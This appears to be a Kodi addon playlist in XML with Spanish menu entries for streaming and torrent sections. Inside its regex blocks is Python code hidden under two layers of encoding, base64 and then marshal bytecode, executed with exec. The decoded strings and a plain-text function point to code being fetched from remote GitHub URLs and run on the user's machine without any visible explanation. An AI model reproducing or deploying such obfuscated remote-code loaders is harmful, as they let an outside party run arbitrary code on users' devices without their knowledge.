import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/Ge0iWOq.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>
--------------------------------------------------------------------------------------------------------------------------------------------------
<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Supercine [COLOR white]Peticiciones[/COLOR]</title>  
<link>$doregex[c]</link>
<regex>
<name>c</name>
<listrepeat><![CDATA[
<title>[c.param1]</title>
<genre>[c.param2]</genre>
<year>[c.param3]</year>
<info>[c.param6]</info>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[c.param4]</thumbnail>
<fanart>[c.param5]</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,xbmc,xbmcaddon,xbmcgui,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '[c.param7]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/thj5usV.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
</item>





<item>
<title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Seleccion Cristal [COLOR white]Torrents [COLOR green][/COLOR]</title>
<link>http://ignorame</link>
<thumbnail>https://i.imgur.com/hEKykpy.jpg</thumbnail>
<fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
<externallink>https://pastebin.com/raw/jRDWbwr7</externallink>
</item>







